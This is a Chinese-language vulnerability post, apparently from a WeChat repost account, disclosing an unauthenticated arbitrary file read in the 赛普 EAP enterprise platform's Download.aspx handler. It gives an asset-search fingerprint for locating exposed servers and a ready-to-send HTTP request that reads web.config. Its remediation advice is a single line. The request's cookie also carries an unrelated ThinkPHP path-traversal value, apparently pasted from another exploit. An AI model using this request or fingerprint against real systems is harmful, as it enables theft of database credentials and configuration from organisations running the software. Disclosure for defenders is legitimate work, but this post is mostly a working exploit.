#  赛普EAP企业适配管理平台Download.aspx任意文件读取漏洞 附POC  
原创 安服仔  北风漏洞复现文库   2026-01-06 16:11  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
赛普EAP企业适配管理平台任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOuvnKS0Yux3LLFNj0hMqoyCaXHe4jbQArA6rR5vnUQibe99vcbqMR6xQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
赛普  
EAP  
企业适配管理平台  
Download.aspx  
任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
赛普EAP企业适配管理平台是一款专为企业设计的综合管理解决方案，旨在帮助企业提高运营效率和灵活性。  
  
  
04  
  
—  
  
资产测绘  
```
"IDWebSoft/"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOzicI2GpOHE5SaWicp6tpg6SINBZGmuoVVC6st19zyEwywn44micSN01ww/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOXtZRJfMEib5kG8icg3L1zyPDzppCeNGdsviaOicSclyHAM7ozk0nmdh7sQ/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
